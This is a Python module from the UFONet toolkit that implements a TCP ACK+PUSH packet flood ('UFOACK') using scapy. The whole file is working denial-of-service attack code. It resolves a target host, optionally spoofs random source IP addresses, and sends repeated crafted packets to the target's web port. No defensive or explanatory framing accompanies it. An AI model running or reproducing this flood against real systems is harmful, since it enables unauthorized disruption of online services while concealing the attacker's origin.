#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket

from core.mods.mod_config import ACKFLOOD_SPEED
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    from scapy.all import *
except:
    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
    sys.exit(2)

# UFONet TCP 'ACK+PUSH' packet attack (UFOACK)
def randIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randInt():
    x = random.randint(1,65535) # TCP ports
    return x

def randPort(start, end):
    x = random.randint(start, end)
    return x

def ackize(ip, sport, rounds, address_dict):
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            if address_dict['start'] is not None and address_dict['end'] is not None:
                s_zombie_port = randPort(int(address_dict['start']), int(address_dict['end']))
            else:
                s_zombie_port = randInt() 
            seq = randInt()
            window = randInt()
            IP_p = IP()
            if address_dict['source'] is None:
                print("[Info] [UFOACK] Using random source IP")
                IP_p.src = randIP()
            else:
                print("[Info] [UFOACK] Using given source IP")
                IP_p.src = address_dict['source']
            try:
                IP_p.dst = ip
            except:
                print("[Error] [AI] [UFOACK] Imposible to resolve IP from 'target' -> [Aborting!]\n")
                break
            TCP_l = TCP()
            TCP_l.sport = s_zombie_port
            TCP_l.dport = sport
            TCP_l.seq = seq
            TCP_l.window = window
            TCP_l.flags = "AP" # FLAGS SET (ACK+PUSH)
            try:
                send(IP_p/TCP_l, verbose=0)
                # print("[Info] [AI] [UFOACK] Firing 'ionized crystals' ["+str(n)+"] -> [IONIZING!]")
                # time.sleep(1/ACKFLOOD_SPEED) # sleep time required for balanced sucess
            except:
                print("[Error] [AI] [UFOACK] Failed to engage with 'ionized crystals' ["+str(n)+"]")
    except:
        print("[Error] [AI] [UFOACK] Failing to engage... -> Is still target online? -> [Checking!]")

class UFOACK(object):
    def attacking(self, target, rounds, address_dict):
        print("[Info] [AI] TCP 'ACK+PUSH' (UFOACK) is ready to fire: [" , rounds, "ionized crystals ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            sport = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            sport = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [UFOACK] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        ackize(ip, sport, rounds, address_dict) # attack with UFOACK using threading
